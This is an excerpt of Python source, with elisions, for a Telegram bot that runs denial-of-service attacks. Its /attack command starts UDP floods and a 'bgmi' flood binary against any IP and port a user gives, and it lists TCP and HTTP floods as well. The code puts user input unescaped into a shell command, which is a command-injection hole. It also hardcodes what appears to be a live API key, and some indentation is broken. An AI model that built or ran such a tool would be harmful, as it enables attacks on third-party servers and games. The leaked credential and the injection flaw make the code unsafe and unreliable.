...
# Keep track of running bgmi UDP flood processes by user ID
shadow_floods = {}

# 🎛️ Function to install all required packages (AI + Bot)
def install_requirements():
    required_packages = [
        "pyTelegramBotAPI",   # Telegram bot API
        "openai",             # For DeepSeek AI
        "requests",           # For HTTP flood if used
        "aiohttp"             # For async operations if needed in future
    ]

    print("🚀 Installing all required packages for bot and AI...")
    ...
    # Optional: Install from requirements.txt if it exists
    if os.path.exists('requirements.txt'):
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
            print("📦 Installed additional packages from requirements.txt")
        except subprocess.CalledProcessError as e:
            print(f"❌ Failed to install from requirements.txt: {e}")
    else:
        print("📁 No requirements.txt file found (skipped)")
...
# 🛠️ Function to send shadow packets
def start_shadow_flood(user_id, target_ip, target_port):
    command = f"./bgmi {target_ip} {target_port} 9999999 1300"
    try:
        process = subprocess.Popen(command, shell=True)
        shadow_floods[user_id] = process
        bot.send_message(user_id, f"🚀 Shadow Flood started on {target_ip}:{target_port} (runs until /stop)")
    except Exception as e:
        bot.send_message(user_id, f"❌ Failed to start Shadow Flood: {e}")
...
client = OpenAI(
    ...
    api_key="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"  # 🔐 Replace with your actual key
)


# 🤖 Smart AI Fallback Reply Function
...
# 🎭 AI-Enhanced Fallback for Unknown Inputs
@bot.message_handler(func=lambda message: True)
def handle_unknown_text(message):
    known_commands = [
        "/start", "/ping", "/uptime", "/attack", "/stop",
        "/id", "/owner", "/rules", "/help"
    ]

    if any(message.text.lower().startswith(cmd) for cmd in known_commands):
        return  # ✅ Let existing handlers process known commands
    ...
    # 💬 Fancy AI Reply with delay
    animated_reply = (
        "💡 I didn't recognize that command, but here's something smart:\n\n"
        f"`{ai_reply}`\n\n"
        "🧠 Powered by DeepSeek-AI | Type /help to see bot commands 📜"
    )
...
def attack(message):
    ...
    try:
        ...
        if len(command_parts) == 2:
            ...
            bot.send_message(message.chat.id, "❌ Invalid command format! Use /attack [protocol] <IP>:<port>")
            return
        ...
        if protocol == 'udp':
            start_udp_flood(user_id, target_ip, target_port)  # your existing python flood
            start_shadow_flood(user_id, target_ip, target_port)  # new shadow flood bgmi subprocess
            ...
            bot.send_message(message.chat.id, f"❌ Unknown protocol '{protocol}'. Supported: udp, tcp, http, https")
            return

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error parsing command: {e}")
...
def stop_attack(message):
    ...
    stopped_any = False  # flag to track if we stopped anything

    # Stop Python thread-based floods
    if user_id in user_attacks:
        futures, stop_event = user_attacks[user_id]
        stop_event.set()
        for future in futures:
            future.cancel()
        del user_attacks[user_id]
    ...
    # Stop bgmi UDP shadow subprocess
    if user_id in shadow_floods:
    try:
        shadow_floods[user_id].terminate()
        del shadow_floods[user_id]
        stopped_any = True
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error stopping Shadow Flood process: {e}")

    # Send response to user
    if stopped_any:
        bot.send_message(message.chat.id, "🛑 All attacks stopped successfully.")
    else:
